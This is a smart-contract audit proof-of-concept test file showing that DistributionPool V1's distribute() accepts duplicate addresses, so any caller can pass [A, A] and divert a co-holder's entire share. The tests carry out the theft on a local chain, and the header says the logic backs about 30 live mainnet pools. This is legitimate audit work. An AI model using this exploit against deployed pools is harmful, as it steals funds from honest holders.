/**
 * AUDIT 2026-08 — proof of concept for finding P-1 (DistributionPool V1).
 *
 * `distribute(userList, token)` never de-duplicates `userList`.
 *
 *   _getTotalParticipation() sums balanceOf(userList[i]) with NO duplicate check
 *   and only requires  sum == participationToken.totalSupply().
 *   _processDistribution() then loops over the SAME list and credits
 *   balanceOf(userList[i]) * totalAmount / total  once PER OCCURRENCE.
 *
 * So any multiset of holders whose balances add up to totalSupply is accepted.
 * A 50% holder passed twice ([A, A]) satisfies the "100% participation" check
 * and is credited the entire distribution; the other holders get nothing.
 *
 * `distributePermissions` only restricts Reward pools to the owner, so on a
 * Treasury (or Payroll) pool ANY address can trigger this.
 *
 * These tests assert the CURRENT (buggy) behaviour so they pass today. When the
 * finding is fixed (de-duplicate the list, or distribute off totalSupply and
 * reject repeated addresses) they must be inverted.
 *
 * V1 is the logic behind the ~30 pools already live on Base mainnet.
 */
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { Contract } from "ethers";
import { expect } from "chai";
import "@nomiclabs/hardhat-web3";
import {
    deployStorage,
    deployPoolLogic,
    deployPoolMaster,
    deployTreasuryTypePool,
} from "../utils/deploys";

describe("AUDIT 2026-08 / P-1: V1 distribute() does not de-duplicate the user list", function () {
    let accounts: SignerWithAddress[];
    let creator: SignerWithAddress;
    let operational: SignerWithAddress;
    let poolOwner: SignerWithAddress;
    let victim: SignerWithAddress;
    let outsider: SignerWithAddress;

    let _storage: Contract;
    let _pm: Contract;
    let _pmc: Contract;
    let _v1: Contract;
    let pool: Contract;

    // pool that pays every 20 000 s, first payment far in the past so a manual
    // distribution is allowed right away
    const distributionInterval = 20000;
    let firstDistributionDate: number;

    beforeEach(async function () {
        accounts = await ethers.getSigners();
        creator = accounts[0];
        operational = accounts[1];
        poolOwner = accounts[2];   // attacker: holds 50% of the shares
        victim = accounts[3];      // honest holder: the other 50%
        outsider = accounts[9];    // no shares at all, no role in the pool

        firstDistributionDate =
            Math.floor(Date.now() / 1000) - distributionInterval * 5 - 567;

        _storage = await deployStorage(creator);
        [_pm, _pmc] = await deployPoolMaster(creator, _storage);
        _v1 = await deployPoolLogic(_storage, creator, "DistributionPool");

        // commission = 300 bps (3%)
        await _pmc.connect(creator)
            .functions.initialize(1, 1, 1, operational.address, 300);
        await _pm.connect(creator).functions.initialize(_pmc.address);
        await _pmc.connect(creator)
            .functions.addLogicVersion(_v1.address, 1, "DistributionPool");
        // treasury pool that receives the protocol commission
        await _pm.connect(creator)
            .functions.createPoolMasterTreasuryPool([operational.address], [100], '');

        // 50 / 50 pool
        pool = await deployTreasuryTypePool(
            _pm, _pmc, poolOwner,
            [poolOwner.address, victim.address], [50, 50],
            firstDistributionDate, 999, distributionInterval
        );

        // fund it with 1 ETH to distribute
        await pool.connect(accounts[10])
            .functions.deposit({ value: ethers.utils.parseEther("1").toString() });
    });

    it("an unprivileged caller passing [A, A] gives A 100% of the distribution and the 50% co-owner 0", async function () {
        const zero = ethers.constants.AddressZero;

        // what the pool considers distributable, and the honest split of it
        const distributable = (await pool.connect(outsider)
            .functions.getTotalDistAmount(zero))[0];
        const commission = distributable.mul(300).div(10000);
        const totalAmount = distributable.sub(commission);
        const honestShare = totalAmount.div(2);
        expect(honestShare).to.be.gt(0);

        // ---- the attack -------------------------------------------------
        // `outsider` is not the owner, not the operational address and holds no
        // shares. On a Treasury pool `distributePermissions` lets it through.
        await pool.connect(outsider)
            .functions.distribute([poolOwner.address, poolOwner.address], zero);

        const attackerCredit = (await pool.connect(outsider)
            .functions.getUserAmounts(poolOwner.address, zero))[0];
        const victimCredit = (await pool.connect(outsider)
            .functions.getUserAmounts(victim.address, zero))[0];

        // A was paid once per occurrence: 50% + 50% = the whole distribution.
        expect(attackerCredit).to.equal(totalAmount);
        expect(victimCredit).to.equal(0);
        expect(attackerCredit).to.equal(honestShare.mul(2));

        // and it is real money: A withdraws the lot, including the victim's half
        const before = await ethers.provider.getBalance(poolOwner.address);
        const tx = await pool.connect(poolOwner).functions.withdrawToken(zero);
        const receipt = await tx.wait();
        const gas = receipt.gasUsed.mul(receipt.effectiveGasPrice);
        const after = await ethers.provider.getBalance(poolOwner.address);
        expect(after.sub(before).add(gas)).to.equal(totalAmount);

        // the victim, holding a genuine 50%, has nothing to withdraw
        await expect(
            pool.connect(victim).functions.withdrawToken(zero)
        ).to.be.rejectedWith("Insufficient balance");
    });

    it("the only constraint is that the multiset of balances sums to totalSupply", async function () {
        const zero = ethers.constants.AddressZero;

        // [A, A, B] = 50 + 50 + 50 = 150 != totalSupply(100) → refused.
        // The contract is not rejecting the DUPLICATE, only the wrong total.
        await expect(
            pool.connect(outsider).functions.distribute(
                [poolOwner.address, poolOwner.address, victim.address], zero
            )
        ).to.be.rejectedWith("Must Match 100% participation to distribute");

        // Any address with no shares is refused too, so the attacker must reuse
        // real holders — which is exactly what makes [A, A] work.
        await expect(
            pool.connect(outsider).functions.distribute([outsider.address], zero)
        ).to.be.rejectedWith("User address has no participation");

        // …and [B, B] steals in the other direction: the victim's address can be
        // used by anyone, no signature from B required.
        await pool.connect(outsider)
            .functions.distribute([victim.address, victim.address], zero);

        const attackerCredit = (await pool.connect(outsider)
            .functions.getUserAmounts(poolOwner.address, zero))[0];
        const victimCredit = (await pool.connect(outsider)
            .functions.getUserAmounts(victim.address, zero))[0];
        expect(attackerCredit).to.equal(0);
        expect(victimCredit).to.be.gt(0);
    });
});
